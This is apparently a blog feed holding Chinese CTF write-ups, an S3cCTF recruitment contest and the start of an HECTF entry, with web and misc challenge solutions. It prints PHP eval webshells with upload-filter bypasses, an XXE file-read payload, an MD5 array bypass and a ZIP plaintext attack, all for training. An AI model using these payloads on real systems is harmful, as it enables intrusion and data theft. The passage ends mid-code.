        <content type="html"><![CDATA[<h1 id="S3cCTF-gyy-Writeup"><a href="#S3cCTF-gyy-Writeup" class="headerlink" title="S3cCTF-gyy-Writeup"></a>S3cCTF-gyy-Writeup</h1><p><strong>出题人：gyy</strong></p><p><strong>写在前面：</strong></p><p>本次招新赛我主要负责WEB方面的出题，当然兼顾一些MISC，本着简单易懂的原则，刚开始出了很多简单WEB题，但是这届新生的实力明显比我们当时强&#x3D; &#x3D;，后期又赶了一些提升题，当然和真正的CTF比赛还是有非常大的距离，例如在群里放出的周六的题目可以看出。所以，这些只是入门CTF的基础，去年的这时，我们参加的招新比赛比今年更加困难（所以今年我有同感地出了不少简单题），我希望大家不要止步于此，当初我也有一腔热血，觉得CTF不过如此（甚至还想双修）。但，走的越高，越会发现自己越渺小，这条道路可能还没有尽头。技术可以后期培养，这次招新比赛分数也只能作为检测基础的测试，如果你有强烈的意向和兴趣，比比赛成绩更为重要，我们欢迎你和我们联系，希望大家不忘初心，砥砺前行。</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="How-to-solve-ctf"><a href="#How-to-solve-ctf" class="headerlink" title="How_to_solve_ctf"></a>How_to_solve_ctf</h2><h3 id="出题解析"><a href="#出题解析" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在指引大家，考了一下HTML的知识</p><h3 id="解题方式"><a href="#解题方式" class="headerlink" title="解题方式"></a>解题方式</h3><p>F12查看源代码，给了提示<code>&lt;!-- html元素是可以修改的 --&gt;</code><br>修改form表单里input文本框的长度限制，提交s3c2020即可获得flag<br>由于是GET传参，也可以直接传<code>key=s3c2020</code>即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122173122547.png" class="" title="web1" loading="lazy"><hr><h2 id="nof12"><a href="#nof12" class="headerlink" title="nof12"></a>nof12</h2><h3 id="出题解析-1"><a href="#出题解析-1" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题利用script限制了鼠标右键和f12</p><h3 id="解题方式-1"><a href="#解题方式-1" class="headerlink" title="解题方式"></a>解题方式</h3><p>与题目 <strong>S3C_NOT_BAD</strong> 重复，Ctrl+U或者burp抓包或者curl访问都可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174018834.png" class="" title="web2" loading="lazy"><hr><h2 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h2><h3 id="出题解析-2"><a href="#出题解析-2" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在考XFF（X-Forwarded-For）和Referer<br>伪造地址三种方式：</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><h3 id="解题方式-2"><a href="#解题方式-2" class="headerlink" title="解题方式"></a>解题方式</h3><p>只有本地管理员才能访问本页面！<br>burp抓包修改即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174702383.png" class="" title="web3" loading="lazy"><hr><h2 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h2><h3 id="出题解析-3"><a href="#出题解析-3" class="headerlink" title="出题解析"></a>出题解析</h3><p>302重定向</p><pre class="language-php" data-language="php"><code class="language-php">//flag.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Flag: '</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s3c&#123;0H_mY_g0d_its_4O4&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//修改 X-Powered-By信息</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location:404.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">//404.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Not Found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- 才怪 --></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"http/1.1 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"status: 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>The requested URL /flag.php was not found on this server.&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><h3 id="解题方式-3"><a href="#解题方式-3" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开点击后跳转Not Found，仔细看发现界面是伪造的</p><img src="/article/S3cCTF-gyy-Writeup/20201122175207502.png" class="" width="404" loading="lazy"><p>因为界面是我自己写的假界面，特意写了个注释，由此想到重定向<br>直接在header里能看到flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175439466.png" class="" title="flag" loading="lazy"><p>拿去base64解一下即可获得flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175814189.png" class="" title="base64" loading="lazy"><hr><h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><h3 id="出题解析-4"><a href="#出题解析-4" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考查PHP和Python脚本，3秒内…有人能做得到嘛？</p><p>本题网上找一个脚本改改完全没问题，其实还有一题计算字符串（原创题目前网上没有脚本），师傅们说不放就没放啦，有兴趣可以做做 <a href="http://49.234.89.193:8088/">题目链接</a>(链接可能会挂，题目随时可能哪天我就关了…)</p><h3 id="解题方式-4"><a href="#解题方式-4" class="headerlink" title="解题方式"></a>解题方式</h3><p>请在3秒内计算以下算式并提交并提交<br>在服务器设的SESSION，3秒刷新，超时也是不算的<br>设了个小坑，抓个包可以看到，每次提交的请求还有个参数<code>submits=提交</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122180918644.png" class="" title="参数" loading="lazy"><p>如果没有就会die退出</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submits'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"少了点东西啊...好好看看吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后放出Payload，师傅们可以自己研究</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/11/22 18:14@Auth ： gyy@File ：1.py@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://49.234.89.193:8029/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submits"</span> <span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1--------------------取算式"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> response<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2--------------------计算算式"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3--------------------提交"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resultres <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span> data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122181549903.png" class="" title="calnum" loading="lazy"><p>本人蹩脚自学的python，语法规范问题请见谅</p><hr><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><h3 id="出题解析-5"><a href="#出题解析-5" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察Linux下Vim的应用，同时考察PHP代码审计及robots协议</p><p>给了hint：vim强退会在当前目录生成生成备份文件</p><h3 id="解题方式-5"><a href="#解题方式-5" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开先看源代码</p><img src="/article/S3cCTF-gyy-Writeup/20201122192109829.png" class="" title="vim" loading="lazy"><p>Recover<br>Linux中，如果vim强退的话（ctrl+z）就会在目录下生成备份文件，如图所示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192350871.png" class="" title="ctrl+z" loading="lazy"><p>而再vim编辑就会有如下提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192439588.png" class="" title="re" loading="lazy"><p>直接Recover恢复即可。</p><p>根据提示，访问.&#x2F;.index.php.swp。发现下载.swp文件<br>这里注意，备份文件是隐藏文件，文件名前面有个点<br>拿去linux系统恢复，可以发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122192914742.png" class="" title="flag1" loading="lazy"><p>由此，flag分为多部分<br>接下来代码审计很简单，回到index.php，POST传参</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>pazzword<span class="token operator">=</span>a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122193206215.png" class="" title="flag2" loading="lazy"><p>机器人会告诉你剩下的，联想robots协议，访问.&#x2F;robots.txt</p><img src="/article/S3cCTF-gyy-Writeup/20201122193300252.png" class="" title="robots" loading="lazy"><p>可得flag在.&#x2F;r&#x2F;o&#x2F;b&#x2F;o&#x2F;a&#x2F;t&#x2F;s&#x2F;1.php</p><img src="/article/S3cCTF-gyy-Writeup/20201122193344579.png" class="" title="flag3" loading="lazy"><p>将三段flag组合即可</p><hr><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><h3 id="出题解析-6"><a href="#出题解析-6" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察文件上传，考察上传绕过的姿势，因为比赛限制，没有出太难的过滤</p><h3 id="解题方式-6"><a href="#解题方式-6" class="headerlink" title="解题方式"></a>解题方式</h3><p>当然，不是真的让你上传个动图。。我服务器里发现了好多奇奇怪怪的图片<br>一般文件上传一句话木马直接获取shell<br><code>&lt;?php @eval($_POST[gyy])?&gt;</code><br>需要能被php解析才行，.txt,.gif都是不可被解析的<br>或者直接用script标签<br><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[gyy]);&lt;/script&gt;</code><br>后缀名限制</p><img src="/article/S3cCTF-gyy-Writeup/20201122194102133.png" class="" title="php" loading="lazy"><p>上传普通图片，被过滤</p><img src="/article/S3cCTF-gyy-Writeup/20201122193716205.png" class="" title="gif" loading="lazy"><p>抓包上传,原始如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122194225470.png" class="" title="post1" loading="lazy"><p>修改如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122195020428.png" class="" title="post2" loading="lazy"><p>请求头检查：content-type，MIME类型限制，修改为<code>image/gif</code><br>文件后缀绕过：只要能被php解析的文件名就可以<br>这里我只限制了<code>.php</code>,<code>.php3</code>,<code>.php4</code>,<code>.php5</code><br>MIME类型限制只允许<code>image/gif</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122195119845.png" class="" title="upload" loading="lazy"><p>然后访问文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122195246767.png" class="" title="upload2" loading="lazy"><p>发现代码被执行了，直接蚁剑连上get shell</p><img src="/article/S3cCTF-gyy-Writeup/20201122195418743.png" class="" title="upload3" loading="lazy"><p>根目录发现flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122195438365.png" class="" title="upload4" loading="lazy"><p>你们真的传了一堆堆奇奇怪怪的图片。。。</p><hr><h2 id="XML-External-Entity"><a href="#XML-External-Entity" class="headerlink" title="XML External Entity"></a>XML External Entity</h2><h3 id="出题解析-7"><a href="#出题解析-7" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察XXE注入，即 XML实体注入</p><h3 id="解题方式-7"><a href="#解题方式-7" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开直接给phpinfo，源代码有提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122195910990.png" class="" title="hint" loading="lazy"><p>底部发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122195933621.png" class="" title="system" loading="lazy"><p>其实是执行了<code>system(&quot;ls&quot;);</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122200056166.png" class="" title="index" loading="lazy"><p>然后每个文件都高亮了语法，<code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code>均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。存在的XXE漏洞具体可以百度研究一下。<br>样例Payload：</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122200729886.png" class="" title="dom" loading="lazy"><p>其实还可以利用写入一句话木马等操作。</p><hr><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="信息搜索"><a href="#信息搜索" class="headerlink" title="信息搜索"></a>信息搜索</h2><h3 id="出题解析-8"><a href="#出题解析-8" class="headerlink" title="出题解析"></a>出题解析</h3><p>信息搜索也是门技术，好好利用搜索引擎可以达到事半功倍的效果.<br>确实，只要仔细搜索，没有任何问题</p><h3 id="解题方式-8"><a href="#解题方式-8" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开五道题，一道道解决</p><h4 id="1-截至2020年10月31日，RFC最新的正式文档编号是多少"><a href="#1-截至2020年10月31日，RFC最新的正式文档编号是多少" class="headerlink" title="1.截至2020年10月31日，RFC最新的正式文档编号是多少?"></a>1.截至2020年10月31日，RFC最新的正式文档编号是多少?</h4><p>RFC文档，Request For Comments，官网连<em>科学上网</em>都不需要</p><img src="/article/S3cCTF-gyy-Writeup/20201122201134715.png" class="" title="rfc" loading="lazy"><p>访问<code>https://www.ietf.org/</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201307663.png" class="" title="rfc" loading="lazy"><p>或者直接访问RFC文档搜索网站<code>https://www.rfc-editor.org/search/rfc_search.php</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201725572.png" class="" title="rfc" loading="lazy"><p>截至2020年10月31日，一查</p><img src="/article/S3cCTF-gyy-Writeup/20201122201943714.png" class="" title="rfc" loading="lazy"><p>最新为RFC8940<br>这种东西最标准还是去官网查</p><h4 id="2-国家网络安全宣传周第一届是在哪一年举行的？"><a href="#2-国家网络安全宣传周第一届是在哪一年举行的？" class="headerlink" title="2.国家网络安全宣传周第一届是在哪一年举行的？"></a>2.国家网络安全宣传周第一届是在哪一年举行的？</h4><p>2014</p><img src="/article/S3cCTF-gyy-Writeup/20201122202110805.png" class="" width="2014" loading="lazy"><h4 id="3-本校校园卡上对应的教学楼是主校区的几号教学楼？"><a href="#3-本校校园卡上对应的教学楼是主校区的几号教学楼？" class="headerlink" title="3. 本校校园卡上对应的教学楼是主校区的几号教学楼？"></a>3. 本校校园卡上对应的教学楼是主校区的几号教学楼？</h4><p>拿出来看看…百度地图打开，</p><img src="/article/S3cCTF-gyy-Writeup/20201122202320233.png" class="" width="1" loading="lazy"><p>全景地图</p><img src="/article/S3cCTF-gyy-Writeup/20201122202433684.png" class="" width="1" loading="lazy"><p>有点老，仔细观察地图，只有1教有那么大地方，2教3教都不会有那么大的中央空地<img src="/article/S3cCTF-gyy-Writeup/20201122202751489.jfif" class="" width="1" loading="lazy"><br>good</p><h4 id="4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"><a href="#4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？" class="headerlink" title="4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"></a>4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？</h4><p>33<br>招新PPT上写的，学校公众号也能查到</p><h4 id="5-截至目前最新的C语言标准是C多少？"><a href="#5-截至目前最新的C语言标准是C多少？" class="headerlink" title="5. 截至目前最新的C语言标准是C多少？"></a>5. 截至目前最新的C语言标准是C多少？</h4><p>18<br>C标准以年号结尾命名，有人问为什么不是C99,C11….我只能说，现在最新的是C18，百度好好查查吧…（2年了）</p><p>全部答对给flag，不行爆破也行</p><hr><h2 id="myid"><a href="#myid" class="headerlink" title="myid"></a>myid</h2><h3 id="出题解析-9"><a href="#出题解析-9" class="headerlink" title="出题解析"></a>出题解析</h3><p>社工大佬，怕了怕了</p><h3 id="解题方式-9"><a href="#解题方式-9" class="headerlink" title="解题方式"></a>解题方式</h3><p>原本考爆破的，后来干脆直接你们社工算了…</p><img src="/article/S3cCTF-gyy-Writeup/20201122203410982.png" class="" title="id" loading="lazy"><p>打开去掉disable标签</p><img src="/article/S3cCTF-gyy-Writeup/2020112220344579.png" class="" title="id" loading="lazy"><p>下面提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122203500307.png" class="" title="id" loading="lazy"><p>原来想考爆破，最后都知道了…id是我学号，直接开始社工，索性改分类为MISC。<br>再给个hint：<code>计算机院 2019 懂？</code><br>首先2019级即前5位为<code>12019</code><br>计算机院为050-055(大概）<br>所以前八位<code>1201905x</code>，爆破一下就好了。<br>当然也有问学长学姐的，问墙的，翻我空间的，查学校名册的，都可以。这题就当玩玩233333<br>ID:12019054018</p><img src="/article/S3cCTF-gyy-Writeup/20201122203854684.png" class="" title="id" loading="lazy"><hr><h2 id="flag-jpg"><a href="#flag-jpg" class="headerlink" title="flag.jpg"></a>flag.jpg</h2><h3 id="出题解析-10"><a href="#出题解析-10" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察工具利用以及查看属性</p><h3 id="解题方式-10"><a href="#解题方式-10" class="headerlink" title="解题方式"></a>解题方式</h3><p>小戈:give me a flag 一看属性竟然用 SteganPEG 而且还没那么简单</p><p>提示很明显，用软件 SteganPEG ，密码就是<code>givemeaflag</code>（生怕你们看不见），其实正规地方在文件的属性里</p><img src="/article/S3cCTF-gyy-Writeup/20201122204149398.png" class="" title="flag" loading="lazy"><p>软件读文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122204353880.png" class="" title="flag" loading="lazy"><p>拖出来打开就是flag</p><hr><h2 id="Manchester"><a href="#Manchester" class="headerlink" title="Manchester"></a>Manchester</h2><h3 id="出题解析-11"><a href="#出题解析-11" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察 学习理解能力 百度曼彻斯特编码</p><h3 id="解题方式-11"><a href="#解题方式-11" class="headerlink" title="解题方式"></a>解题方式</h3><p>大白话解释：低电平是0，高电平是1。<br>曼彻斯特编码<code>01-&gt;1</code> <code>10-&gt;0</code><br>当时出这题用的C写的，蹩脚的东西看看就好…</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> a1<span class="token punctuation">,</span>a2<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">&#123;</span>a1<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token char">'0'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token char">'1'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token char">'1'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token char">'0'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>a1<span class="token operator">&amp;&amp;</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> </code></pre><p>得到<code>011100110011001101100011011110110100110101100001011011100100001101101000010001010111001101110100011001010111001001011111011101110011000101110100011010000101111100110000001100010011000001111101</code><br>复制去二进制转字符，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/2020112220515011.png" class="" title="man" loading="lazy"><hr><h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><h3 id="出题解析-12"><a href="#出题解析-12" class="headerlink" title="出题解析"></a>出题解析</h3><p>水题，考察知识面，和搜索…</p><h3 id="解题方式-12"><a href="#解题方式-12" class="headerlink" title="解题方式"></a>解题方式</h3><p>真的水题，搜索标题<code>SlientEye</code>，是的，这是个软件<br>默认设置解密，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/20201122205451153.png" class="" title="slient" loading="lazy"><hr><h2 id="Plaintext"><a href="#Plaintext" class="headerlink" title="Plaintext"></a>Plaintext</h2><h3 id="出题解析-13"><a href="#出题解析-13" class="headerlink" title="出题解析"></a>出题解析</h3><p>写的很清楚，明文攻击<br>给了hint，暗示伪加密<br>开赛题坚持了这么久我没想到…</p><h3 id="解题方式-13"><a href="#解题方式-13" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开发现压缩包三文件全加密，压缩包里的注释</p><pre class="language-none"><code class="language-none">亲眼所见，亦非真实也许是虚伪的，也许需要AZPR</code></pre><p>明示软件AZPR，这是个爆破软件<br>伪加密百度有一篇很详细的文章<br>修改加密位为<code>00</code>，不知道哪个文件是伪加密直接所有加密位为<code>00</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122210335385.png" class="" width="00" loading="lazy"><p>保存后解压只有副本那个文件可以保存，其他两个文件是真加密</p><img src="/article/S3cCTF-gyy-Writeup/20201122210502282.png" class="" width="00" loading="lazy"><p>根据明文攻击方法，将这个文件打包zip然后去题目再下一遍原文件,此时文件被修改，也可以改回去</p><p>用AZPR选择明文攻击即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122210917960.png" class="" title="在这里插入图片描述" loading="lazy"><p>可以看到密钥被恢复了，不用找密码了，直接可以保存</p><img src="/article/S3cCTF-gyy-Writeup/20201122211504935.png" class="" title="在这里插入图片描述" loading="lazy"><p>保存文件，其实已经破解出来了</p><img src="/article/S3cCTF-gyy-Writeup/20201122210823677.png" class="" title="在这里插入图片描述" loading="lazy"><p>或者用rbkcrack也可以<br>直接打开flag.txt得flag</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 HECTF Write-up</title>
      <link href="article/2020-HECTF-Write-up/"/>
      <url>article/2020-HECTF-Write-up/</url>
      
        <content type="html"><![CDATA[<h3 id="by-gyy"><a href="#by-gyy" class="headerlink" title="by:gyy"></a>by:gyy</h3><p>抢了到人生第一次大一点点比赛的一血</p><img src="/article/2020-HECTF-Write-up/1.png" class="" title="first" loading="lazy"><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目链接：<a href="http://121.196.32.184:12001/">http://121.196.32.184:12001/</a></p><p>打开发现<code>nonono ，once again！</code></p><p>查看源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"You need the file is xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono ，once again！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>flag不在<span class="token operator">/</span>flag中哦，你应该找找奇奇怪怪的文件名<span class="token operator">--</span><span class="token operator">></span></code></pre><p><code>$_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code><br>老MD5强类型比较，传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL&#x3D;NULL的情况，绕过比较。<br>即<code>a[]=1&amp;b[]=a</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160030053.png" class="" title="image-20201129160030053" loading="lazy"><p>访问.&#x2F;3b8cf4731c36d20776c76e20f9c774c7.php</p><pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string double-quoted-string">"/xxx"</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token 